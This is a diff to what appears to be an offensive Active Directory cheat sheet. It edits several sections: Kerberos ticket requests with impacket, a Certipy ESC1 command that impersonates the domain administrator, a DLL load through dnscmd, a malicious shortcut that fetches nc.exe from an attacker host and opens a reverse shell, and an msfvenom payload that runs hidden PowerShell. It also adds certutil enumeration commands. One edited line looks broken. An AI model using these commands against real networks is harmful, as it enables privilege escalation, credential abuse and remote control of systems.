@@ -548,7 +548,7 @@ https://datafetcher.com/graphql-json-body-converter
 https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 
 +---------- .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; kcme
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
 
 +---------- .ccache to evil-winrm ----------+
 KRB5CCNAME='$USERNAME.ccache' evil-winrm -i $DC -r $DOM
@@ -660,8 +660,8 @@ WriteOwner
 https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
 
 +---------- .ccache ----------+
-impacket-getTGT $DOM/'$USERNAME':'$PASSWORD'; kcme
-impacket-getTGT $DOM/'$USERNAME' -hashes ':$HASH'; kcme
+impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
+impacket-getTGT $DOM/'$USERNAME' -hashes ':'; kcme
 
 +---------- ESC1 ----------+
 adminSid=$(certipy account -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -target $DC -key-size '4096'
@@ -1461,6 +1461,12 @@ dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
 +---------- Malicious .lnk ----------+
 curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
+
++---------- Enumerate Certificate Services ----------+
+certutil -ADCA
+certutil -user
+certutil -CATemplates -config mist-DC01-CA
+certutil -Template User
 
 +---------- Shell From File ----------+
 msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f dll > x.dll
